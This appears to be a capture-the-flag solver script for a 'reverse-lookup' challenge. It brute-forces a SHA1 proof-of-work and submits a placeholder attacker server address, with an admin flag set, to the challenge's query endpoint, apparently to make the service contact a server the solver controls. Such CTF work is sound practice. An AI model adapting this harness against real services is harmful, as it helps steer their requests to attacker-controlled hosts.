import sys
from requests import session
from hashlib import sha1
from string import ascii_letters
from itertools import product
import re

SERVER = "12.34.56.78"
FOR_ADMIN = True
URL_NONCE = "http://reverse-lookup.hackable.software/"
URL_QUERY = "http://reverse-lookup.hackable.software/query"

def solve_pow(nonce):
    print(f"Finding pow for {nonce}")
    for i in range(1, 5):
        for comb in product(ascii_letters, repeat=i):
            pow = ''.join(comb)
            if "313377" in sha1(nonce+pow.encode()).hexdigest():
                print(f"Found: {pow}")
                return pow
    else:
        assert False, "PoW failed"
if len(sys.argv) == 2:
    print(solve_pow(sys.argv[1].encode('ascii')))
    exit()

s = session()

nonce = re.findall(b'"([a-z0-9]+)">" <br>', s.get(URL_NONCE).content)[0]
pow = solve_pow(nonce)

data={"nonce" : nonce, "pow": pow, "srv" : SERVER}
if FOR_ADMIN: data["for_admin"] = "on"

r = s.post(URL_QUERY, data)


print(r.text)

